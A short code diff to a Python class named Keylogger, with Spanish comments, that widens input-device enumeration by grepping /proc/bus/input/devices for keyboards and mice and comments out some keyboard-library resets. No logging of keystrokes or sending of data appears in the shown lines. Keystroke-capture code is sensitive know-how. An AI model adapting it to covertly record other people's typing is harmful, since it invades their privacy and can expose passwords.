@@ -200,7 +200,10 @@ class Keylogger:
         Lee todos los dispositivos de entrada conectados en el sistema por id y
         los devuelve.
         """
-        return subprocess.getoutput('ls /dev/input/by-id/')
+        keyboard = subprocess.getoutput('cat /proc/bus/input/devices | grep -i -w "keyboard"')
+        mouse = subprocess.getoutput('cat /proc/bus/input/devices | grep -i -w "mouse"')
+
+        return subprocess.getoutput('ls /dev/input/by-id/') + keyboard + mouse
 
     def start_read_keyloggers_callback(self):
         """
@@ -237,10 +240,10 @@ class Keylogger:
                 # Reestablezco lecturas de teclado en la librería keyboard
                 keyboard._nixkeyboard.device = None
                 keyboard._nixkeyboard.build_device()
-                keyboard._nixkeyboard.build_tables()
+                #keyboard._nixkeyboard.build_tables()
                 sleep(0.2)
                 #keyboard._hooks = {}
-                keyboard._listener = keyboard._KeyboardListener()
+                #keyboard._listener = keyboard._KeyboardListener()
                 sleep(0.2)
 
                 # Vuelvo a quitar todos los hooks, esto activa eventos por defecto
@@ -249,7 +252,7 @@ class Keylogger:
                 # Añado de nuevo el hook para leer teclado
                 #keyboard.hook(self.callback_keyboard)
 
-                # TODO → Reiniciar MOUSE
+                # TODO → Reiniciar MOUSE, comprobar si ya se realiza?
 
                 #exit(0)
 
